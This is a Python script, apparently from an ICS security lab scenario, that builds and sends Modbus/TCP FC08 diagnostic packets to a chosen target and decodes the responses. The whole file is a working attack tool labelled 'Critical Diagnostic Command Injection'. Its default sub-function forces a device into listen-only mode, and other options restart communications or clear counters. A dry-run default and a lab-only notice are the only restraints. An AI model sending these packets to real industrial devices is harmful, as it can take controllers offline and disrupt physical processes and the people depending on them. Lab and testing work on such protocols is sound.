#!/usr/bin/env python3
import socket
import argparse
import struct
import binascii
import sys

SUBFUNCTION_NAMES = {
    0x0001: "Restart Communications Option",
    0x0004: "Force Listen Only Mode",
    0x000A: "Clear Counters and Diagnostic Register",
    0x000B: "Return Bus Message Count",
    0x000C: "Return Bus Communication Error Count",
}

EXCEPTION_CODES = {
    0x01: "Illegal Function",
    0x02: "Illegal Data Address",
    0x03: "Illegal Data Value",
    0x04: "Slave Device Failure",
    0x05: "Acknowledge",
    0x06: "Slave Device Busy",
    0x08: "Memory Parity Error",
    0x0A: "Gateway Path Unavailable",
    0x0B: "Gateway Target Device Failed to Respond",
}

def build_fc08_request(tid, unit_id, subfunction, data):
    protocol_id = 0x0000
    function_code = 0x08

    pdu = struct.pack(">BHH", function_code, subfunction, data)
    length = 1 + len(pdu)

    mbap = struct.pack(">HHHB", tid, protocol_id, length, unit_id)
    return mbap + pdu

def parse_response(resp):
    if not resp:
        return "No response or timeout."

    if len(resp) < 8:
        return f"Invalid response: {binascii.hexlify(resp).decode()}"

    tid, proto, length = struct.unpack(">HHH", resp[:6])
    unit_id = resp[6]
    fc = resp[7]

    lines = []
    lines.append(f"Raw response hex: {binascii.hexlify(resp).decode()}")
    lines.append(f"Transaction ID: {tid}")
    lines.append(f"Protocol ID: 0x{proto:04X}")
    lines.append(f"Length: {length}")
    lines.append(f"Unit ID: {unit_id}")
    lines.append(f"Function Code: 0x{fc:02X}")

    if fc == 0x08:
        lines.append("Result: Normal FC08 Diagnostic Response")
        if len(resp) >= 12:
            sub = struct.unpack(">H", resp[8:10])[0]
            data = struct.unpack(">H", resp[10:12])[0]
            lines.append(f"Sub-function: 0x{sub:04X}")
            lines.append(f"Sub-function Name: {SUBFUNCTION_NAMES.get(sub, 'Unknown')}")
            lines.append(f"Data: 0x{data:04X}")

    elif fc == 0x88:
        lines.append("Result: FC08 Exception Response")
        if len(resp) >= 9:
            exc = resp[8]
            lines.append(f"Exception Code: 0x{exc:02X}")
            lines.append(f"Exception Name: {EXCEPTION_CODES.get(exc, 'Unknown Exception Code')}")

    else:
        lines.append("Result: Other Modbus Response")

    return "\n".join(lines)

def main():
    parser = argparse.ArgumentParser(description="Lab-only Modbus/TCP FC08 diagnostic command sender.")
    parser.add_argument("--target", required=True, help="Target Modbus server IP")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit-id", type=int, default=1)
    parser.add_argument("--tid", type=int, default=1)
    parser.add_argument("--subfunction", default="0004", help="e.g., 0001, 0004, 000A, 000B, 000C")
    parser.add_argument("--data", default="0000")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--send", action="store_true", help="Actually send packet. Without this, dry-run only.")
    args = parser.parse_args()

    try:
        subfunction = int(args.subfunction, 16)
        data = int(args.data, 16)
    except ValueError:
        print("[!] subfunction and data must be hex strings, e.g., 0004")
        sys.exit(1)

    payload = build_fc08_request(args.tid, args.unit_id, subfunction, data)

    print("=" * 60)
    print("Scenario D - Critical Diagnostic Command Injection")
    print("=" * 60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Unit ID: {args.unit_id}")
    print(f"Sub-function: 0x{subfunction:04X}")
    print(f"Sub-function Name: {SUBFUNCTION_NAMES.get(subfunction, 'Unknown / Vendor-specific')}")
    print(f"Data: 0x{data:04X}")
    print(f"Payload hex: {binascii.hexlify(payload).decode()}")

    if not args.send:
        print("[*] Dry-run mode. Packet was not sent.")
        print("[*] Add --send only in an authorized lab environment.")
        return

    try:
        with socket.create_connection((args.target, args.port), timeout=args.timeout) as sock:
            sock.settimeout(args.timeout)
            sock.sendall(payload)

            try:
                resp = sock.recv(1024)
            except socket.timeout:
                resp = b""

            print()
            print("[*] Response:")
            print(parse_response(resp))

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
